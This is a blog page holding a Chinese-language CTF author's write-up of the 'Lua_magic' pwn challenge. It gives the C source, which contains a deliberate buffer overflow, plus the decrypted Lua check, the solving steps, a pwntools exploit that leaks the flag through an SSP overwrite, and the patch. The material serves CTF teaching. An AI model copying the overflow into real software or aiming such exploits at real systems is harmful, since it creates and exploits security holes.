@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>An interacting pwn | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="前言前段时间打了国赛，出了道bulid的pwn题，用到了几个杂而有趣的知识点，玩起来不太常规，做起来甚至可以说是有点难受，在此记录一下。 题目链接 文末也有链接 出题思路最近学了学安卓，想到了一个之前分析过的mobile案例，一个apk通过调用lua实现函数的重写（就是之前血洗高校的一个apk），觉得很好玩，决定应用到题目里边。 文件结构：一个二进制文件，一个加密过的Lua文件，一个flag文件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="An interacting pwn">
+<meta property="og:url" content="http://example.com/2020/09/24/2020-09-24-Lua_magic/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言前段时间打了国赛，出了道bulid的pwn题，用到了几个杂而有趣的知识点，玩起来不太常规，做起来甚至可以说是有点难受，在此记录一下。 题目链接 文末也有链接 出题思路最近学了学安卓，想到了一个之前分析过的mobile案例，一个apk通过调用lua实现函数的重写（就是之前血洗高校的一个apk），觉得很好玩，决定应用到题目里边。 文件结构：一个二进制文件，一个加密过的Lua文件，一个flag文件。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165319-badfa85c-fb1e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165333-c39101e4-fb1e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165349-ccf343f0-fb1e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165403-d536d414-fb1e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165413-db41e0b0-fb1e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165428-e46d4396-fb1e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165443-ed31547c-fb1e-1.png">
+<meta property="article:published_time" content="2020-09-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200920165319-badfa85c-fb1e-1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2020-09-24-Lua_magic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/09/24/2020-09-24-Lua_magic/" class="article-date">
+  <time class="dt-published" datetime="2020-09-23T16:00:00.000Z" itemprop="datePublished">2020-09-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      An interacting pwn
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间打了国赛，出了道bulid的pwn题，用到了几个杂而有趣的知识点，玩起来不太常规，做起来甚至可以说是有点难受，在此记录一下。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pic4xiu/C/blob/master/%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5/pwn/bin.zip">题目链接</a></p>
+<p>文末也有链接</p>
+<h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>最近学了学安卓，想到了一个之前分析过的mobile案例，一个apk通过调用lua实现函数的重写（就是之前血洗高校的一个apk），觉得很好玩，决定应用到题目里边。</p>
+<p>文件结构：一个二进制文件，一个加密过的Lua文件，一个flag文件。</p>
+<p>程序流程：</p>
+<ul>
+<li>二进制程序部署在特定端口，使用nc访问</li>
+<li>程序起来后会加载加密过的lua文件到内存，之后程序在内存中解密lua程序，在程序中输入字符，将字符交给lua进行处理，必须满足某种关系程序才能向下进行。</li>
+<li>完成绕过后选择了缓冲区溢出，文件没关canary，用ssp leak可以直接把flag读出来。整体看下来就是一个披着pwn题外衣的C加lua程序逆向题。</li>
+<li>因为用到了好多C语言lua库函数的好多函数，用ida分析程序会发现非常恶心，得仔细扣，之前没接触过这种的还得现学。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/lua/lua-environment.html">环境搭建</a></p>
+<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><blockquote>
+<p>写的时候现学现卖，请师傅们指教</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;lua5.1/lua.h&gt;</span><br><span class="line">#include &lt;lua5.1/lualib.h&gt;</span><br><span class="line">#include &lt;lua5.1/lauxlib.h&gt;</span><br><span class="line">char flag[0x20];</span><br><span class="line">char* c;</span><br><span class="line">uint8_t *enc(uint8_t *data, int size) &#123;//加密函数，和解密函数完全一致</span><br><span class="line">	uint8_t *temp = (uint8_t *)malloc(size);</span><br><span class="line">	int k[3]=&#123;2,3,5&#125;;</span><br><span class="line">	int i;</span><br><span class="line">	if (size) &#123;</span><br><span class="line">		for (i = 0; i &lt; size; i++) &#123;</span><br><span class="line">			temp[i] = data[i]^k[i%3];</span><br><span class="line">		&#125;</span><br><span class="line">	return temp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(stdout,0,2,0);</span><br><span class="line">	FILE *f = fopen(&quot;main.lua&quot;, &quot;rb&quot;);//读入同目录加密过的lua文件</span><br><span class="line">	if (f == NULL)</span><br><span class="line">		return -1;</span><br><span class="line">	fseek(f, 0, SEEK_END);</span><br><span class="line">	long file_size = ftell(f);</span><br><span class="line">	uint8_t *buf = (uint8_t *)malloc(file_size);</span><br><span class="line">	rewind(f);</span><br><span class="line">	fread(buf, sizeof(char), file_size, f);</span><br><span class="line">	uint8_t *rea = enc(buf,file_size);</span><br><span class="line">	lua_State *luaEnv = lua_open();//创建一个新的lua_State</span><br><span class="line">	luaopen_base(luaEnv);</span><br><span class="line">	luaL_openlibs(luaEnv);</span><br><span class="line">	if(!luaEnv)</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	int loadInfo = luaL_loadstring(luaEnv,rea);//以字符串形式把解密过的lua语句load进去</span><br><span class="line">	if(loadInfo)</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	int i,j,a,k=3;</span><br><span class="line">	puts(&quot;Hello I&#x27;m lua.\nLet&#x27;s experience something different&quot;);</span><br><span class="line">	while(k)&#123;</span><br><span class="line">		puts(&quot;Enter two numbers in your heart;)&quot;);</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;i);</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;j);</span><br><span class="line">		lua_pcall(luaEnv,0,0,0);</span><br><span class="line">		lua_getglobal(luaEnv,&quot;hndl&quot;);//找这个名字的函数</span><br><span class="line">		lua_pushnumber(luaEnv,i);//以堆栈形式传参</span><br><span class="line">		lua_pushnumber(luaEnv,j);</span><br><span class="line">		puts(&quot;mamimami hon~~~~&quot;);</span><br><span class="line">		lua_pcall(luaEnv,2,1,0);//完成调用，之后的参数分别是参数个数、返回值个数和错误处理函数（0表示无）</span><br><span class="line">		a=lua_tonumber(luaEnv,-1);//同样以堆栈方式取值</span><br><span class="line">		puts(&quot;who am I?&quot;);</span><br><span class="line">		sleep(1);</span><br><span class="line">		printf(&quot;%d!!\n&quot;,a);</span><br><span class="line">		if(a==random())//和伪加密数进行比较</span><br><span class="line">			k--;//重复次数</span><br><span class="line">		else</span><br><span class="line">		&#123;	puts(&quot;Your ideas are different from Lua&#x27;s :( sry&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	char b[4];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp = fopen(&quot;flag&quot;,&quot;r&quot;);</span><br><span class="line">	fread(flag,1,0x20,fp);</span><br><span class="line">	puts(&quot;All right,the magic failed&quot;);</span><br><span class="line">	read(0,b,280);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">//gcc -o Lua_magic te.c -llua5.1</span><br></pre></td></tr></table></figure>
+
+<p>看下lua加密前的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function BitXOR(a,b)</span><br><span class="line">    local p,c=1,0</span><br><span class="line">    while a&gt;0 and b&gt;0 do</span><br><span class="line">        local ra,rb=a%2,b%2</span><br><span class="line">        if ra~=rb then c=c+p end</span><br><span class="line">        a,b,p=(a-ra)/2,(b-rb)/2,p*2</span><br><span class="line">    end</span><br><span class="line">    if a&lt;b then a=b end</span><br><span class="line">    while a&gt;0 do</span><br><span class="line">        local ra=a%2</span><br><span class="line">        if ra&gt;0 then c=c+p end</span><br><span class="line">        a,p=(a-ra)/2,p*2</span><br><span class="line">    end</span><br><span class="line">    return c</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function hndl(i,j)</span><br><span class="line">	j = BitXOR(5977654,j)</span><br><span class="line">	return BitXOR(i,j)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>由于lua5.1不支持位运算，有必要写个异或运算函数到lua文件里边。我没改BitXOR名字，直接用了师傅的轮子。同时作为白嫖党吃人嘴短，做异或处理的时候用的5977654和stackoverflow的轮子<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5977654/how-do-i-use-the-bitwise-operator-xor-in-lua">qustionid</a>对应</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>选手拿题后应该是一个Lua_magic和经过处理enc过的main.lua，lua文件长这样</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165319-badfa85c-fb1e-1.png"></p>
+<p>用ida简单看下Lua_magic</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165333-c39101e4-fb1e-1.png"></p>
+<p>其实还好，用到的都分析出来了，之后就是动态调试程序，把内存中解密完的lua程序dump出来（enc执行完后下断）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165349-ccf343f0-fb1e-1.png"></p>
+<p>然后一起结合dump出来的lua程序和ida一起分析就好了。</p>
+<p>随机数的生成自己写个C脚本：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165403-d536d414-fb1e-1.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165413-db41e0b0-fb1e-1.png"></p>
+<p>算起来的话就反着来就行，和1异或完和5977654异或就好了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165428-e46d4396-fb1e-1.png"></p>
+<p>最后进入最后一步</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165443-ed31547c-fb1e-1.png"></p>
+<p>读入0x118字节，完全够了，全暴力填flag的bss地址就好，exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#ip=sys.argv[1]</span><br><span class="line">#port=sys.argv[2]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p=process(&#x27;./Lua_magic&#x27;)</span><br><span class="line">#p = remote(ip, port)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;1808823120&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;840963569&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;1684516446&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(0x602140)*35)</span><br><span class="line">#p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="修复-总结"><a href="#修复-总结" class="headerlink" title="修复 &amp; 总结"></a>修复 &amp; 总结</h2><p>因为b就4个字节，patch成<code>read(0,b,4);</code>即可完成修复。</p>
+<p>这题流程比较长，在划分题目难度的时候觉得难点和亮点都在lua那块，就归到了中等难度。在好几个地方都能上一个难度系数，如加解密lua语句函数enc、lua脚本处理输入逻辑、read进去b后再搞个lua语句处理等，但想了想还是算了，觉得点到为止wei最佳，本身出这种题还是考验知识积累和快速学习，感觉再难点就偏了。</p>
+<p>刚出完我觉得还是很有趣的，自己做完感觉几个考察的点还是有点僵硬，出题真的是门艺术。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/09/24/2020-09-24-Lua_magic/" data-id="cuid3urvWlMSRwO7m2i-3Q5Ou" data-title="An interacting pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/01/13/2021-01-13-fuzz_note/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Reading notes
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/09/02/2020-09-02-frida_hook/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Introduction to Frida</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
